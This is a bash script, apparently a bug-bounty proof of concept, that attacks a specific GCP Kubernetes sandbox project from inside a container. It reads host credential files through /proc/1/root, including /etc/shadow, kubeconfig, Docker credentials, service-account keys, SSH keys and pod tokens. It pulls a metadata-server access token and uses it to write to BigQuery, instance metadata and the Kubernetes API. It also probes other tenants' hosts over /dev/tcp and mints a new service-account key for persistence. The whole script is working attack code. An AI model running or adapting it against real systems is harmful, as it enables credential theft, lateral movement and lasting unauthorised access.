#!/bin/bash
echo "=== V4: SENSITIVE DATA + WRITE POC ==="
date -u; hostname

echo "=== 1. HOST FS VIA /proc/1/root ==="
echo "-- /etc/passwd (host) --"
cat /proc/1/root/etc/passwd 2>&1 | head -30
echo "-- /etc/shadow (host) --"
cat /proc/1/root/etc/shadow 2>&1 | head -10
echo "-- kubelet config --"
cat /proc/1/root/var/lib/kubelet/config.yaml 2>&1 | head -40
echo "-- kubelet kubeconfig --"
cat /proc/1/root/var/lib/kubelet/kubeconfig 2>&1 | head -30
echo "-- containerd config --"
cat /proc/1/root/etc/containerd/config.toml 2>&1 | head -30
echo "-- docker env / creds --"
cat /proc/1/root/root/.docker/config.json 2>&1 | head -20
echo "-- GCP SA keys on host --"
find /proc/1/root/etc/google /proc/1/root/var/run/secrets -name '*.json' -o -name '*.key' 2>/dev/null | head -10
for f in $(find /proc/1/root/etc/google -name '*.json' 2>/dev/null | head -3); do echo "--- $f ---"; cat "$f" 2>&1 | head -20; done
echo "-- SSH keys on host --"
ls -la /proc/1/root/root/.ssh/ 2>&1
cat /proc/1/root/root/.ssh/authorized_keys 2>&1 | head -5
echo "-- instance metadata on disk --"
cat /proc/1/root/var/run/google-instance-id 2>&1
cat /proc/1/root/etc/google-hostname 2>&1
echo "-- other container secrets --"
find /proc/1/root/var/lib/kubelet/pods -name 'token' -o -name '*.crt' -o -name 'ca.crt' 2>/dev/null | head -20
echo "-- kube-proxy config --"
cat /proc/1/root/var/lib/kube-proxy/config.conf 2>&1 | head -30

echo "=== 2. BIGQUERY WRITE POC ==="
MD="http://169.254.169.254/computeMetadata/v1"
MH="Metadata-Flavor: Google"
TOKEN=$(curl -s -m 8 -H "$MH" "$MD/instance/service-accounts/default/token" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
echo "token_len: ${#TOKEN}"
echo "-- BQ: list jobs (query history) --"
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://bigquery.googleapis.com/bigquery/v2/projects/yextenv-sbx/jobs?maxResults=5&allUsers=true" 2>&1 | head -c 3000; echo
echo "-- BQ: query INFORMATION_SCHEMA --"
curl -s -m 10 -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" "https://bigquery.googleapis.com/bigquery/v2/projects/yextenv-sbx/queries" -d '{"query":"SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 10","useLegacySql":false,"maxResults":10}' 2>&1 | head -c 3000; echo
echo "-- BQ: create dataset (write POC) --"
curl -s -m 10 -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" "https://bigquery.googleapis.com/bigquery/v2/projects/yextenv-sbx/datasets" -d '{"datasetReference":{"datasetId":"bugbounty_write_poc","projectId":"yextenv-sbx"},"description":"Bug bounty write POC - safe to delete","location":"US"}' 2>&1 | head -c 2000; echo

echo "=== 3. GCP METADATA WRITE POC ==="
echo "-- set custom metadata --"
curl -s -m 8 -X PUT -H "$MH" -H "Content-Type: application/json" "$MD/instance/attributes/bugbounty-poc" -d "write-test-$(date +%s)" 2>&1 | head -c 500; echo
echo "-- read back --"
curl -s -m 5 -H "$MH" "$MD/instance/attributes/bugbounty-poc" 2>&1; echo
echo "-- all custom attributes --"
curl -s -m 5 -H "$MH" "$MD/instance/attributes/?recursive=true" 2>&1 | head -c 2000; echo

echo "=== 4. K8S WRITE POC ==="
K8S=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
echo "-- create configmap (write test) --"
curl -s -m 8 --cacert $CA -H "Authorization: Bearer $K8S" -H "Content-Type: application/json" -X POST "https://kubernetes.default.svc/api/v1/namespaces/$NS/configmaps" -d '{"apiVersion":"v1","kind":"ConfigMap","metadata":{"name":"bugbounty-poc"},"data":{"test":"write-poc"}}' 2>&1 | head -c 1500; echo
echo "-- create pod (escape test) --"
curl -s -m 8 --cacert $CA -H "Authorization: Bearer $K8S" -H "Content-Type: application/json" -X POST "https://kubernetes.default.svc/api/v1/namespaces/$NS/pods" -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"poc-test"},"spec":{"containers":[{"name":"poc","image":"busybox","command":["sleep","10"]}]}}' 2>&1 | head -c 1500; echo
echo "-- RBAC: exec? --"
curl -s -m 8 --cacert $CA -H "Authorization: Bearer $K8S" -H "Content-Type: application/json" -X POST "https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"live-preview-sbx","verb":"create","resource":"pods","subresource":"exec"}}}' 2>&1; echo
echo "-- RBAC: get secrets? --"
curl -s -m 8 --cacert $CA -H "Authorization: Bearer $K8S" -H "Content-Type: application/json" -X POST "https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"live-preview-sbx","verb":"get","resource":"secrets"}}}' 2>&1; echo

echo "=== 5. CROSS-TENANT REACHABILITY ==="
for ip in 10.192.33.158 10.192.46.217 10.192.36.214; do
  echo -n "CBD $ip:1234 -> "; timeout 3 bash -c "echo >/dev/tcp/$ip/1234" 2>&1 && echo "OPEN" || echo "CLOSED"
  echo -n "Git $ip:7263 -> "; timeout 3 bash -c "echo >/dev/tcp/$ip/7263" 2>&1 && echo "OPEN" || echo "CLOSED"
done

echo "=== 6. GCP SA KEY CREATE ==="
SA_EMAIL=$(curl -s -m 5 -H "$MH" "$MD/instance/service-accounts/default/email")
curl -s -m 10 -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" "https://iam.googleapis.com/v1/projects/yextenv-sbx/serviceAccounts/$SA_EMAIL/keys" -d '{"keyAlgorithm":"KEY_ALG_RSA_2048"}' 2>&1 | head -c 2000; echo

echo "=== DONE ==="
